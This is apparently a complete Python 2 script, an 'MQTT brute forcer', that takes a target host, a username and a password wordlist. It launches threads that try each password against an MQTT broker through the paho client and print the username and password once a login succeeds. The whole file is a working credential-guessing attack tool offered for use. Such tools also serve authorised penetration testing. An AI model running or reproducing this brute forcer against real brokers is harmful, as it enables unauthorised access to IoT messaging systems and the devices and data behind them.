#!/usr/bin/env python2
# Stupid MQTT Brute Forcer
# Coded by Alex. Twitter: @_tmp0
# https://github.com/zombiesam/joffrey/blob/master/joffrey-BH-2017.py
# Shoutout to ch3rn0byl, arch4y, evlb, acidgen and h4v0k
# Todo: try on broker with tls. make stuff pretty?

try:
    import paho.mqtt.client as mqtt
except:
    print '[!] Could not import paho. Install it genius.'
    quit(42)

from time import sleep
from random import randint
import optparse, threading
import sys

reload(sys)
sys.setdefaultencoding('utf8')

parser = optparse.OptionParser('Usage: python %s [ARGS]' % sys.argv[0])
parser.add_option('-t', dest='target', type='string', help='Target domain or ip to invade')
parser.add_option('-p', dest='port', type='int', help='Target port (optional)')
parser.add_option('--threads', dest='nrThreads', type='int', help='Amount of threads for the King to do as he please with')
parser.add_option('-u', dest='username', type='string', help='Specify username')
parser.add_option('-w', dest='wordlist', type='string', help='Path to wordlist')
(options, args) = parser.parse_args()
target = options.target
port = options.port
nrThreads = options.nrThreads
username = options.username
wordlist = options.wordlist

if target == None or username == None or wordlist == None:
    print parser.print_help()
    quit(42)

if nrThreads == None:
    nrThreads = 1
    print '[*] Thread argv not supplied, setting threads to 1'

if port == None:
    # TLS@8883
    port = 1883

print '[*] TARGET => ' + target
print '[*] PORT => ' + str(port)
print '[*] THREADS => ' + str(nrThreads)
print '[*] USERNAME => ' + username
print '[*] WORDLIST => ' + wordlist

class bigslap(threading.Thread):
    def __init__(self, target, port, username, pArray):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port
        self.target_username = username
        self.pArray = pArray
        self.hearteater = mqtt.Client('C%d' % (randint(1,1000)))
        self.p_id = False

    def on_connect(self, c, u, f, rc):
        if rc == 0: # rc 0 equals successful login, rest equals trouble
            self.p_id = True

    def run(self):
        global pFound
        for passwd in self.pArray:
            if pFound == True:
                return
            self.hearteater.username_pw_set(username=self.target_username, password=passwd)
            self.hearteater.on_connect = self.on_connect
            self.hearteater.connect(self.target)
            self.hearteater.loop_start()
            sleep(1)
            try:
                self.hearteater.disconnect()
                self.hearteater.loop_stop()
            except:
                pass
            if self.p_id == True:
                print '[+] Username: %s\n[+] Password: %s' % (self.target_username, passwd)
                pFound = True
                break
        del self.hearteater

with open(wordlist) as f:
    lenWordlist = sum(1 for line in f)

print '[*] Parsed %d passwords from %s' %(lenWordlist, wordlist)
thread_counter = 0
i = 1
wList_counter = 1
wList_total = 0
wList = []

global pFound
pFound = False
bEOF = False
print '[*] Hearteater will try to strike true!'
with open(wordlist) as infile:
    for line in infile:
        if pFound == True:
            break
        wList.append(line.strip('\n'))
        if wList_counter == 10:
            wList_total += wList_counter
            t = bigslap(target, port, username, wList)
#           t.setDaemon(True)
            t.start()
            del wList
            wList = []
            thread_counter += 1
            wList_counter = 0

        if thread_counter == nrThreads and bEOF == False:
            t.join()

            thread_counter = 0

        if i == lenWordlist:
            bEOF = True
            wList_total += wList_counter
            t = bigslap(target, port, username, wList)
            t.setDaemon(True)
            t.start()
            t.join()

        sys.stdout.write(' > %d/%d stabs\r' % (wList_total, lenWordlist))
        sys.stdout.flush()
        i += 1
        wList_counter += 1

t.join()
if not pFound:
    print '[*] Argh.. shouldn\'t had drunk that wine...'
else:
    print '[*] Took a good %d stabs to find the heart!' % wList_total
    print '[*] Long live the king!'
